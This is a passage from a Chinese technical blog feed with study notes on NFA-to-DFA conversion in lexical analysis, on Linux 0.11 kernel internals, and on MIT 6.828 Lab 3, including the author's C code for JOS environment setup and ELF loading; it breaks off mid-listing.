src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202310121758670.png"></p><p>这样产生的NFA有以下的性质:<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202310121802370.png"></p><h3 id="从NFA到DFA"><a href="#从NFA到DFA" class="headerlink" title="从NFA到DFA"></a>从NFA到DFA</h3><p>其实就是消除ε转换(目标1)和对同一输入符号的多种转换(目标2).</p><h4 id="子集构造算法"><a href="#子集构造算法" class="headerlink" title="子集构造算法"></a>子集构造算法</h4><p><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202310121820731.png"><br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202310121821896.png"></p><p>分析一下这个算法是怎么实现这两个目标的.</p><p>通过ε-closure()来合并只通过ε转换可以达到的状态为一个状态集,这个状态集是该算法操作的基本单位(目标1).<br>对于某个状态T对某个特定字符a的一种或多种(对于转换的结果而言)转换关系F(T,a),产生一个新的状态(这个状态是NFA中F(T,a)的所有输出状态的集合).之后再根据该状态集合里的每个状态在NFA中的转换关系得到状态集合之间的转换关系(目标2).</p><p>其实,两个目标都是通过将状态合并为状态集合的方式来实现的.<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202310121820231.png"></p><h3 id="NFA的双堆栈模拟"><a href="#NFA的双堆栈模拟" class="headerlink" title="NFA的双堆栈模拟"></a>NFA的双堆栈模拟</h3><p>至此我们已经完成了对正规表达式r的识别器的构造.而实际上,NFA也是可以直接模拟的.</p><h4 id="算法描述"><a href="#算法描述" class="headerlink" title="算法描述"></a>算法描述</h4><p>回想一下我们是怎么实现NFA到DFA转换的那两个目标,可以发现该模拟算法实质上是在运行中构造DFA.</p><p><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202310121839249.png"></p><h4 id="算法实现"><a href="#算法实现" class="headerlink" title="算法实现"></a>算法实现</h4><p>我们要实现的结构有两个,当前状态集合,要转换到的状态集合.注意这里与DFA模拟时不同,DFA中状态集合是实现为一个新的状态,有状态集合之间独立的转换关系(新的转换表),而模拟NFA时我们只具有单个状态之间的转换关系.</p><p>这两个结构可以以两个栈的形式实现.一个栈表示当前状态集合,一个栈表示要转换到的状态集合.压入所有在ε-closure(当前状态)的输出状态.转换时遍历当前状态集合的每一个状态并进行状态转换,压入结果到另一个栈中.清空当前状态集合,两个栈交换身份.</p><h3 id="最长词素匹配"><a href="#最长词素匹配" class="headerlink" title="最长词素匹配"></a>最长词素匹配</h3><p>常见有如下的实现:如果有多个模式匹配成功,选择最长词素匹配的模式.<br>当当前状态集合中含有接受状态时,记录当前输入指针的位置和该接受状态后继续识别,直到NFA进入终止(无法状态转换或输入结束),恢复到最近一次保存的输入指针位置,以该接受状态为结果.</p><h3 id="基于DFA的模式匹配器的优化"><a href="#基于DFA的模式匹配器的优化" class="headerlink" title="基于DFA的模式匹配器的优化"></a>基于DFA的模式匹配器的优化</h3><h4 id="NFA的重要状态"><a href="#NFA的重要状态" class="headerlink" title="NFA的重要状态"></a>NFA的重要状态</h4><p>如果一个NFA的状态有一个标记为非ε的出边,那么该状态为重要状态.<br>如果两个子集的重要状态相同且两者同时包含或不包含NFA的接受状态,那么这两个子集可被认为是等同的.</p><blockquote><p>The constructed NFA has only one accepting state, but this state, having<br>no out-transitions, is not an imp ortant state. By concatenating a unique right<br>endmarker # to a regular expression r , we give the accepting state for r a<br>transition on #, making it an imp ortant state of the NFA for (r )#. In other<br>words, by using the augmented regular expression (r )#, we can forget ab out<br>accepting states as the subset construction pro ceeds; when the construction is<br>complete, any state with a transition on # must b e an accepting state.</p></blockquote><h4 id="Functions-Computed-From-the-Syntax-Tree"><a href="#Functions-Computed-From-the-Syntax-Tree" class="headerlink" title="Functions Computed From the Syntax Tree"></a>Functions Computed From the Syntax Tree</h4><h5 id="Compute"><a href="#Compute" class="headerlink" title="Compute"></a>Compute</h5><p>为了直接从正规表达式r构造DFA,需要从语法树中计算这四个函数.Each de nition refers to the syntax tree for a particular<br>augmented regular expression (r )#</p><p>直白点说,nullable就是该位置代表的字符串是否可以为空(ε).<br>firstpos就是该节点所代表的字符串可能的开始位置集合.<br>lastpos就是该节点所代表的字符串可能的结束位置集合.<br>followpos就是可能的紧跟着该位置的位置集合.<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202310122309087.png"><br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202310122309685.png"></p><p><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202310122312703.png"></p><p>最后我们需要的其实只有follow集,根据求出的follow集可以得到这样一个没有ε的NFA<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202310131045245.png"></p><p><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202310131044965.png"></p><h5 id="TO-DFA"><a href="#TO-DFA" class="headerlink" title="TO DFA"></a>TO DFA</h5><p>其实感觉和之前的思想是差不多的,状态-&gt;状态集合.<br>使用根节点的first集合并初始状态,以是否有#转换来合并接受状态.其他状态由followpos来合并.<br>差别就在于之前是通过NFA的转换关系来合并的,这里是直接通过计算follow集来合并的(其实感觉是一回事).<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202310131046225.png"><br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202310131046738.png"></p><h4 id="最小化DFA的状态数"><a href="#最小化DFA的状态数" class="headerlink" title="最小化DFA的状态数"></a>最小化DFA的状态数</h4><p>每一个正规集都可以由一个状态最少的DFA识别,这个DFA是唯一的.<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202310131120540.png"><br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202310131120171.png"></p><h4 id="表压缩算法"><a href="#表压缩算法" class="headerlink" title="表压缩算法"></a>表压缩算法</h4><p><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202310131134804.png"><br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202310131134760.png"></p>]]></content>
      
      
      <categories>
          
          <category> 学习笔记 </category>
          
          <category> 编译原理 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Lexical-Analysis </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux内核设计的艺术 阅读笔记</title>
      <link href="/2023/The%20Art%20Of%20Linux%20Kernel%20Design--Notes/"/>
      <url>/2023/The%20Art%20Of%20Linux%20Kernel%20Design--Notes/</url>
      
        <content type="html"><![CDATA[<p>Linux0.11内核.正文部分记录过程,引用部分记录知识点和理解.</p><h1 id="main函数之前的功能"><a href="#main函数之前的功能" class="headerlink" title="main函数之前的功能"></a>main函数之前的功能</h1><h2 id="加载操作系统"><a href="#加载操作系统" class="headerlink" title="加载操作系统"></a>加载操作系统</h2><p>经典流程:<br>计算机加电设置cs:ip为0xffff0,运行ROM中的BIOS,BIOS初始化中断向量表和一些硬件设备,加载0盘0道1扇区的引导程序bootsect到0x7c00处.bootsect是与操作系统配套的,规划物理内存,加载操作系统,设置根设备为软盘.</p><blockquote><p>Linux0.11要求系统必须存在一个根文件系统,其他文件系统挂接其上.因此Linux的启动需要两部分数据,即系统内核镜像和根文件系统.(kernel pwn中的bzimage和文件系统(比如busybox提供的))</p></blockquote><span id="more"></span><h2 id="保护模式"><a href="#保护模式" class="headerlink" title="保护模式"></a>保护模式</h2><p>关闭中断.设置全局描述符表(GDT),打开A20gate实现32位寻址(实模式下寻址范围为低1MB).CR0PE标志置1,enable 保护模式,GDT启用,段基址寄存器以选择子形式使用.</p><p>设置段寄存器以适应保护模式,建立内核页目录表,建立中断描述符表(IDT),开启分页模式.以ret模式进入main函数.</p><h1 id="环境设备初始化及激活进程0"><a href="#环境设备初始化及激活进程0" class="headerlink" title="环境设备初始化及激活进程0"></a>环境设备初始化及激活进程0</h1><p>初始化根设备和硬盘.设置缓冲区.</p><blockquote><p>除内核代码及其数据所占物理空间之外,其余物理内存主要分为3部分,主内存区(进程代码运行的空间),缓冲区(主机与外设进行数据交互的中转站),虚拟盘(可以缓存外设的数据,提高效率).</p></blockquote><p>建立内存管理基址mmu,将中断异常与IDT挂接(其实这里才是建立中断描述符表吧).开启部分中断.</p><p>初始化块设备请求项结构</p><blockquote><p>Linux0.11将外设分为两类:<br>块设备:将存储空间等分为若干同样大小的小存储空间块,每个块有块号,可以独立,随机读写,如硬盘,软盘.<br>字符设备:以字符为单位进行IO通信,如键盘,命令行显示器.</p></blockquote><p>进程想与块设备沟通,必须经过主机内存中的缓冲区.请求项管理结构就是管理缓冲区中缓冲块与块设备上逻辑块之间读写关系的数据结构.是以一个数组,同时也维护一个请求链表.</p><p>挂接交互界面相关外设的中断服务例程.如串行口,显示器,键盘.</p><p>初始化进程0,设置task_struct,使进程0具有处理系统调用的能力,设置时钟中断做好进程切换的准备工作.</p><p>最后以iret(唯一的从高权限到低权限的方式)的方式切换到3特权级,之前运行的内核控制流正式成为进程0.</p><h1 id="进程1的创建及执行"><a href="#进程1的创建及执行" class="headerlink" title="进程1的创建及执行"></a>进程1的创建及执行</h1><p>进程0通过fork创建进程1,设置相关数据结构,切换到进程1.</p><blockquote><p>通常有以下两种情况可以产生进程切换:</p><ol><li>允许进程运行的时间结束.每个进程在创建时都被赋予了有限的时间片,当时间片减少到0便发生进程切换.</li><li>进程的运行停止.比如等待外设的数据,等待其他程序运行的结果,进程主动停止一段时间或进程执行完毕等等.</li></ol></blockquote><p>进程1安装硬盘文件系统.格式化虚拟盘(使其具有文件系统相关内容,引导块,超级块,格式化之后虚拟盘正式成为一个块设备)并更换根设备为虚拟盘.</p><blockquote><p>操作系统中的文件系统可以大致分为两部分,一部分在操作系统内核中,另一部分在硬盘,软盘,虚拟盘中.<br>文件系统用inode(i结点)来管理文件,一个inode管理一个文件.文件的路径在操作系统中由目录文件中的目录项管理,一个目录项对应一级路径,目录文件也是文件,也由一个inode管理.一个目录文件挂在另一个目录文件的目录项上,就成了父子目录的关系.所有的文件最终挂接成一个树形结构,树根i节点就叫这个文件系统的根i节点.一个逻辑设备(一个物理设备可分成多个逻辑设备)只能包含一个这样的树形结构.</p></blockquote><blockquote><p>加载文件系统最重要的标志,就是把一个逻辑设备上的文件系统的根i节点,关联到另一个文件系统的i节点,也就是常说的mount.可以联系一下之前容器中bind mount的操作.</p></blockquote><blockquote><p>一个文件系统必须挂接在另一个文件系统上,必然就存在一个根文件系统,Linux0.11中的super_block[8]中保存的根设备的超级块对应的文件系统便是根文件系统.</p></blockquote><h1 id="进程2的创建及执行"><a href="#进程2的创建及执行" class="headerlink" title="进程2的创建及执行"></a>进程2的创建及执行</h1><p>加载完根文件系统之后,进程1(其实是kernel)具备了对设备文件的访问能力.使用open和dup打开/dev/tty0文件作为标准输入,输出,错误文件.</p><p>进程1创建进程2并切换到进程2.进程2关闭标准输入重新以/etc/rc为标准输入,execve运行/bin/sh的shell程序.相当于shell的初始化,执行/etc/rc里的预置命令,比如创建进程并加载/etc/update程序</p><blockquote><p>update进程将缓冲区中的数据同步到外设.该程序每隔一段时间就会被唤醒,完成同步工作后挂起等待下一次唤醒.</p></blockquote><p>update进程挂起后控制流回到进程2,进程2完成善后工作后退出.</p><p>进程1继续执行,以/dev/tty0为标准输入重建shell.shell在等待输入后挂起,当接收到键盘中断,shell进程从字符缓冲队列(其实就是tty0的内容)读取指令数据,并完成相应操作.</p><p>至此系统进入怠速状态.</p><h1 id="文件操作"><a href="#文件操作" class="headerlink" title="文件操作"></a>文件操作</h1><blockquote><p>安装文件系统就是在根文件系统的基础上,把硬盘中的文件系统安装在根文件系统上,使操作系统也具备<code>以文件形式与硬盘进行数据交互的能力</code>.</p></blockquote><blockquote><p>安装文件系统分三步:<br>1)将硬盘的超级块读取出来并载入super_block[8].<br>2)将虚拟盘上指定的i节点读出,加载到系统的inode_table[32]中.<br>(<del>是不是意味着最多只能挂载8个文件系统(设备),挂载点最多32个?</del>)<br>3) 将硬盘上的超级块挂接到指定的i节点上.</p></blockquote><h1 id="进程间通信"><a href="#进程间通信" class="headerlink" title="进程间通信"></a>进程间通信</h1><h2 id="管道机制"><a href="#管道机制" class="headerlink" title="管道机制"></a>管道机制</h2><blockquote><p>操作系统在内存中为每个管道开辟一页内存,为这一页内存赋予文件的属性,这一页内存由两个进程共享,但不会分配给任何进程,只由内核掌控.</p></blockquote><blockquote><p>从技术上看,管道就是一页内存.<br>1)文件属性:创建管道相当于创建(并打开)一个文件,进程对管道的访问形式与访问文件相同.<br>2)减少页属性:该页不映射到进程的地址空间内.无法被进程以内存形式访问.</p></blockquote><h2 id="信号机制"><a href="#信号机制" class="headerlink" title="信号机制"></a>信号机制</h2><blockquote><p>发送信号:<br>1)进程通过调用特定的库函数给另一个进程发送信号,另一种方式是用户通过键盘输入信息产生键盘中断后,中断服务例程给进程发送信号.发送信号的实质是设置信号位图上的信号位.(这也是为何未处理的相同信号会丢失的原因)</p></blockquote><blockquote><p>系统检测进程接收到的信号:<br>进程并不能检测收到的信号,该工作由内核完成.</p><ol><li>在系统调用返回之前检测当前进程是否接收到信号.</li><li>时钟中断产生后,其中断处理例程执行结束之前检测.</li></ol></blockquote><blockquote><p>处理信号.当用户程序不需要处理信号时,信号处理函数完全不参与用户进程的执行,当用户进程需要处理信号时,进程的程序将暂时停止执行,转而去执行信号处理函数,执行完毕后将从暂停的现场继续执行.</p></blockquote><p>这里处理信号的方式挺有意思的,解决了我看CSAPP时的一个疑问.</p><blockquote><p>在系统调用返回前或时钟中断返回前,先把内核栈中保存的寄存器备份在当前进程的<code>用户栈</code>中,修改内核栈中的寄存器使得iret之后跳转到用户空间的信号处理函数.处理完成后,再通过前面备份在用户空间的指令和数据,返回用户空间执行.</p></blockquote><p>这里又有一个问题,既然已经回到用户态了,那即使在用户栈上布置的暂停现场的状态,也无法通过ret指令完成状态(如edi等寄存器)的恢复.原来在信号处理函数完成后,从栈上弹出的返回地址是一个restorer函数的地址,它将完成用户进程状态的恢复并再次ret到用户进程.</p>]]></content>
      
      
      <categories>
          
          <category> 学习笔记 </category>
          
          <category> 操作系统 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Kernel </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MIT6.828 Lab3</title>
      <link href="/2023/6.828-Lab3/"/>
      <url>/2023/6.828-Lab3/</url>
      
        <content type="html"><![CDATA[<h1 id="Lec-7"><a href="#Lec-7" class="headerlink" title="Lec 7"></a>Lec 7</h1><p>一些虚拟内存实现的技巧,如延迟分配,写时复制等<br><a href="https://pdos.csail.mit.edu/6.828/2018/lec/l-usingvm.pdf">https://pdos.csail.mit.edu/6.828/2018/lec/l-usingvm.pdf</a></p><h2 id="Lab3-User-Environments"><a href="#Lab3-User-Environments" class="headerlink" title="Lab3 User Environments"></a>Lab3 User Environments</h2><h3 id="PartA-User-Environments-and-Exception-Handling"><a href="#PartA-User-Environments-and-Exception-Handling" class="headerlink" title="PartA: User Environments and Exception Handling"></a>PartA: User Environments and Exception Handling</h3><h4 id="Creating-and-Running-Environments"><a href="#Creating-and-Running-Environments" class="headerlink" title="Creating and Running Environments"></a>Creating and Running Environments</h4><p>创建并初始化envs,env_setup_vm函数为环境e建立一个专属的页目录表,由于在UTOP上的内核空间映射对每个环境都是相同的,所以可以直接拷贝kern_pgdir过来.</p><span id="more"></span><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line"><span class="title function_">env_init</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">{</span><br><span class="line"><span class="comment">// Set up envs array</span></span><br><span class="line"><span class="comment">// LAB 3: Your code here.</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Env</span>* <span class="title">e</span>;</span></span><br><span class="line"><span class="keyword">for</span>(e = envs;e&lt;envs+NENV;++e)</span><br><span class="line">{</span><br><span class="line">e-&gt;env_id = <span class="number">0</span>;</span><br><span class="line">e-&gt;env_status = ENV_FREE;</span><br><span class="line">e-&gt;env_link = (e==envs+NENV<span class="number">-1</span>)?<span class="number">0</span>:e+<span class="number">1</span>;</span><br><span class="line">}</span><br><span class="line">env_free_list = envs;</span><br><span class="line"><span class="comment">// Per-CPU part of the initialization</span></span><br><span class="line">env_init_percpu();</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">int</span></span><br><span class="line"><span class="title function_">env_setup_vm</span><span class="params">(<span class="keyword">struct</span> Env *e)</span></span><br><span class="line">{</span><br><span class="line"><span class="type">int</span> i;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">PageInfo</span> *<span class="title">p</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Allocate a page for the page directory</span></span><br><span class="line"><span class="keyword">if</span> (!(p = page_alloc(ALLOC_ZERO)))</span><br><span class="line"><span class="keyword">return</span> -E_NO_MEM;</span><br><span class="line"></span><br><span class="line"><span class="comment">// LAB 3: Your code here.</span></span><br><span class="line">e-&gt;env_pgdir = page2kva(p);</span><br><span class="line"><span class="built_in">memcpy</span>(e-&gt;env_pgdir,kern_pgdir,PGSIZE);</span><br><span class="line">p-&gt;pp_ref++;</span><br><span class="line"></span><br><span class="line"><span class="comment">// UVPT maps the env's own page table read-only.</span></span><br><span class="line"><span class="comment">// Permissions: kernel R, user R</span></span><br><span class="line">e-&gt;env_pgdir[PDX(UVPT)] = PADDR(e-&gt;env_pgdir) | PTE_P | PTE_U;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>由于还没有文件系统,JOS采用将ELF文件直接链接到内核的方式来提供用户程序,load_icode函数按照binary文件中的ELF头和程序头,将binary映像加载到用户进程(以JOS的概念,进程应该改成环境)空间中,并建立用户页表的相应映射.</p><p>实现这一函数主要是熟悉ELF头和程序头各项的意义,其实在MBR加载内核映像的时候我们已经完成过相同的操作.注意页目录表的切换.</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span></span><br><span class="line"><span class="title function_">load_icode</span><span class="params">(<span class="keyword">struct</span> Env *e, <span class="type">uint8_t</span> *binary)</span></span><br><span class="line">{</span><br><span class="line"><span class="comment">// LAB 3: Your code here.</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Proghdr</span> *<span class="title">ph</span>, *<span class="title">eph</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Elf</span> *<span class="title">elfhdr</span> =</span> (<span class="keyword">struct</span> Elf *)binary;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(elfhdr-&gt;e_magic!=ELF_MAGIC)</span><br><span class="line">panic(<span class="string">"invalid ELF format,magic is not correct\n"</span>);</span><br><span class="line"></span><br><span class="line">ph = (<span class="keyword">struct</span> Proghdr *)((<span class="type">uint8_t</span>*)elfhdr+elfhdr-&gt;e_phoff);</span><br><span class="line">eph = ph+elfhdr-&gt;e_phnum;</span><br><span class="line"></span><br><span class="line"><span class="comment">//为使之后能直接使用memcpy,切换到用户页表.</span></span><br><span class="line">lcr3(PADDR(e-&gt;env_pgdir));</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(;ph&lt;eph;++ph)</span><br><span class="line">{</span><br><span class="line"><span class="keyword">if</span> (ph-&gt;p_filesz &gt; ph-&gt;p_memsz)</span><br><span class="line">panic(<span class="string">"file size is great than memmory size\n"</span>);</span><br><span class="line"><span class="keyword">if</span>(ph-&gt;p_type==ELF_PROG_LOAD)</span><br><span class="line">{</span><br><span class="line">region_alloc(e-&gt;env_pgdir,ph-&gt;p_va,ph-&gt;p_memsz);</span><br><span class="line"><span class="built_in">memcpy</span>(ph-&gt;p_va,binary+ph-&gt;p_offset,ph-&gt;p_filesz);</span><br><span class="line"><span class="built_in">memset</span>(ph-&gt;p_va+ph-&gt;p_filesz,<span class="number">0</span>,ph-&gt;p_memsz-ph-&gt;p_filesz);</span><br><span class="line">}</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">e-&gt;env_tf.tf_eip = elfhdr-&gt;e_entry;</span><br><span class="line"><span class="comment">// Now map one page for the program's initial stack</span></span><br><span class="line"><span class="comment">// at virtual address USTACKTOP - PGSIZE.</span></span><br><span class="line">region_alloc(e-&gt;env_pgdir,USTACKTOP-PGSIZE,PGSIZE);</span><br><span class="line"></span><br><span class="line">lcr3(PADDR(kern_pgdir));</span><br><span class="line"></span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Allocate len bytes of physical memory for environment env,</span></span><br><span class="line"><span class="comment">// and map it at virtual address va in the environment's address space.</span></span><br><span class="line"><span class="comment">// Does not zero or otherwise initialize the mapped pages in any way.</span></span><br><span class="line"><span class="comment">// Pages should be writable by user and kernel.</span></span><br><span class="line"><span class="comment">// Panic if any allocation attempt fails.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="type">static</span> <span class="type">void</span></span><br><span class="line"><span class="title function_">region_alloc</span><span class="params">(<span class="keyword">struct</span> Env *e, <span class="type">void</span> *va, <span class="type">size_t</span> len)</span></span><br><span class="line">{</span><br><span class="line"><span class="comment">// LAB 3: Your code here.</span></span><br><span class="line"><span class="comment">// (But only if you need it for load_icode.)</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Hint: It is easier to use region_alloc if the caller can pass</span></span><br><span class="line"><span class="comment">//   'va' and 'len' values that are not page-aligned.</span></span><br><span class="line"><span class="comment">//   You should round va down, and round (va + len) up.</span></span><br><span class="line"><span class="comment">//   (Watch out for corner-cases!)</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">PageInfo</span>* <span class="title">pp</span>;</span></span><br><span class="line"><span class="type">void</span>* end_va = ROUNDUP(va+len,PGSIZE);</span><br><span class="line">va = ROUNDDOWN(va,PGSIZE);</span><br><span class="line"><span class="keyword">for</span>(;va&lt;end_va;va += PGSIZE)</span><br><span class="line">{</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>((pp = page_alloc(ALLOC_ZERO))==<span class="number">0</span>)</span><br><span class="line">{</span><br><span class="line">panic(<span class="string">"region_alloc:out of memory"</span>);</span><br><span class="line">}</span><br><span class="line">page_insert(e-&gt;env_pgdir,pp,va,PTE_U|PTE_W|PTE_P);</span><br><span class="line">}</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>之后便可以创建用户环境并运行.</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line"><span class="title function_">env_create</span><span class="params">(<span class="type">uint8_t</span> *binary, <span class="keyword">enum</span> EnvType type)</span></span><br><span class="line">{</span><br><span class="line"><span class="comment">// LAB 3: Your code here.</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Env</span>* <span class="title">e</span>;</span></span><br><span class="line"><span class="type">int</span> ret = env_alloc(&amp;e,<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(ret&lt;<span class="number">0</span>)</span><br><span class="line">panic(<span class="string">"env_alloc:%e"</span>,ret);</span><br><span class="line">e-&gt;env_type = type;</span><br><span class="line">load_icode(e,binary);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">void</span></span><br><span class="line"><span class="title function_">env_run</span><span class="params">(<span class="keyword">struct</span> Env *e)</span></span><br><span class="line">{</span><br><span class="line"><span class="comment">// LAB 3: Your code here.</span></span><br><span class="line"><span class="keyword">if</span>(curenv != <span class="literal">NULL</span>)</span><br><span class="line">{</span><br><span class="line"><span class="keyword">if</span>(curenv-&gt;env_status==ENV_RUNNING)</span><br><span class="line">curenv-&gt;env_status=ENV_RUNNABLE;</span><br><span class="line">}</span><br><span class="line">curenv = e;</span><br><span class="line">e-&gt;env_status=ENV_RUNNING;</span><br><span class="line">e-&gt;env_runs++;</span><br><span class="line">lcr3(PADDR(e-&gt;env_pgdir));</span><br><span class="line"></span><br><span class="line">env_pop_tf(&amp;e-&gt;env_tf);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><h5 id="env相关流程分析"><a href="#env相关流程分析" class="headerlink" title="env相关流程分析"></a>env相关流程分析</h5><h6 id="创建与初始化"><a href="#创建与初始化" class="headerlink" title="创建与初始化"></a>创建与初始化</h6><p>i386_init函数在mem_init函数中完成envs数组的内存分配并在kern_pgdir中完成映射.<br>调用env_init,初始化envs数组中的各env,并链入env_free_list等待分配,load新的带有用户段的GDT,设置LDT.</p><h6 id="运行准备与运行"><a href="#运行准备与运行" class="headerlink" title="运行准备与运行"></a>运行准备与运行</h6><p>env_create函数创建一个针对特定二进制(ELF)文件的运行环境.先调用env_alloc函数分配一个env结构,设置env环境(包括各段选择子,这是切换到用户级权限的关键之一),并为env建立一个单独的页表,映射内核及该页表本身.<br>调用load_icode函数按ELF头和文件头记录的信息为ELF格式的可执行文件创建内存映像,设置Trapframe-&gt;tf_eip为该程序的入口点,为环境映射一个初始栈.<br>env_run函数设置相关运行信息,调用env_pop_tf函数用env-&gt;env_tf设置程序状态,开始以用户级权限运行程序.</p><h4 id="Handling-Interrupts-and-Exceptions"><a href="#Handling-Interrupts-and-Exceptions" class="headerlink" title="Handling Interrupts and Exceptions"></a>Handling Interrupts and Exceptions</h4><p>trapentry.S中以宏的方式形式定义了各中断处理例程的入口,以及所有traps共用的例程alltraps.<br>该函数按照Trapframe的结构为trap函数压栈准备参数,设置ds和es寄存器.然后调用trap函数且不再返回.</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span 